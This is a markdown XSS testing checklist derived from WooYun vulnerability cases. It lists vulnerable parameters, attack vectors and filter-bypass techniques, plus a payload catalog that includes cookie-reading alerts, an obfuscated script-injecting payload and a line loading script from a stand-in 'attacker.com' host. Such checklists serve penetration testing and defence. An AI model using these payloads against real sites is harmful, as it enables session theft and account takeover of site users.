# XSS Testing Checklist
> Derived from 46 real-world vulnerability cases (WooYun 2010-2016)

## High-Risk Parameters to Test
| Parameter | Frequency | Notes |
|-----------|-----------|-------|
| `id` | 2x | Reflected in page content |
| `photourl` | 1x | Image URL parameters; direct injection |
| `w` / `kwd` | 1x | Search keyword parameters |
| `url` / `sohuurl` | 1x | URL redirect/embed parameters |
| `uid` / `status` | 1x | User profile fields |
| `auth_str` | 1x | Authentication string reflected in page |
| `m` | 1x | Module/method selectors |
| `rf` | 1x | Referrer parameters |
| `vers` | 1x | Version parameters in Flash embeds |
| `word` / `get` | 1x | Search and query parameters |

## XSS Type Distribution
| Type | Observed Cases | Risk |
|------|---------------|------|
| Stored XSS | ~65% | Critical - persists, affects all viewers |
| Reflected XSS | ~25% | High - requires victim click |
| DOM-based XSS | ~10% | High - client-side only |

## Common Attack Vectors (by frequency)

### 1. Stored XSS via User Input Fields
- **Forum posts / comments**: Most common stored XSS entry point
- **Profile fields**: Username, bio, personal description
- **Blog content**: Post titles and body content
- **Mobile app submissions**: WAP pages with weaker filtering than PC
- **Forwarded content**: Social sharing features re-rendering HTML

### 2. Reflected XSS via URL Parameters
- Search boxes and keyword parameters
- Error pages reflecting user input
- Redirect URL parameters
- Image/resource URL parameters

### 3. Flash-Based XSS
- SWF files with `allowscriptaccess="always"`
- Flash embed tags loading external SWF files
- ExternalInterface.call() in ActionScript

## Payload Catalog

### Basic Detection
```
"><script>alert(1)</script>
<script>alert(document.cookie)</script>
<img src=x onerror=alert(1)>
```

### Filter Bypass Payloads
```
<img src=# onerror=alert(/wooyun/)>
<select autofocus onfocus=alert(1)>
<textarea autofocus onfocus=alert(1)>
" onfocus="alert(1)" autofocus="
" onmouseout=javascript:alert(document.cookie)>
<iframe src=javascript:alert(1)>
```

### Encoded Payloads
```
<img/src=1 onerror=(function(){window.s=document.
  createElement(String.fromCharCode(115,99,114,105,
  112,116));window.s.src=String.fromCharCode(104,116,
  116,112,...);document.body.appendChild(window.s)})()>
```

### External Script Loading
```
<script src=//attacker.com/xss.js></script>
"><script src=//short.example/xxxxx></script>
```

## Bypass Techniques
- **Tag alternatives**: Use `<img>`, `<select>`, `<textarea>`, `<svg>` when `<script>` is filtered
- **Event handlers**: `onfocus`, `onerror`, `onmouseout`, `onload` as alternatives to inline script
- **Autofocus trick**: `<input autofocus onfocus=alert(1)>` triggers without user interaction
- **HTML5 features**: New tags and event handlers bypass legacy filters
- **Flash embed**: `allowscriptaccess=always` enables JS execution from SWF
- **Case variation and encoding**: Mix case, use HTML entities, URL encoding
- **DOM context escape**: Close existing tags with `">` before injecting

## Quick Test Vectors
```
1. "><script>alert(1)</script>           (basic reflected)
2. <img src=x onerror=alert(1)>          (tag alternative)
3. " autofocus onfocus="alert(1)         (attribute injection)
4. <svg/onload=alert(1)>                 (SVG context)
5. javascript:alert(1)                   (URL context)
6. </script><script>alert(1)</script>    (script context escape)
```

## High-Value Targets
- **Comment/review systems**: Stored XSS reaching admin panels
- **User profile pages**: Username/bio fields rendered on public pages
- **Search results pages**: Reflected XSS via keyword parameters
- **Mobile/WAP versions**: Often weaker filtering than desktop
- **Social sharing features**: Content re-rendered across contexts
- **Admin panels via blind XSS**: Input fields reviewed by admins
